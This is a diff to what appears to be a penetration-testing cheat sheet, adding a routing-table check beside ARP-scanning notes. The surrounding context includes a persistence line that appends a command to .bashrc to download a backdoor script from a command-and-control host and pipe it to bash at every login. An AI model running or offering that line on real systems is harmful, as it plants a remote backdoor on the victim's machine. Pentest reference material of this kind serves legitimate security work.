@@ -207,7 +207,11 @@ Pentest:
       icon: mdi-network
       desc: |
         > uses ARP to gather IPs on the spécified range (only works on the same boradcast domain (same subnet))
-       
+
+        ```bash
+        ## Identify connected network when placed on a VPN subnet
+        netstat -rn
+        ```
         ```bash
         ## create a list of target IPs in target_ips.txt
         netdiscover -r $TARGET -P > netdiscover_arp.txt
@@ -479,6 +483,7 @@ Pentest:
         echo "curl https://c2cserver.fr/backdoor.sh | bash" >> .bashrc    ## Loads Everytime theuser opens a session
         ```
         
+
 
 
 
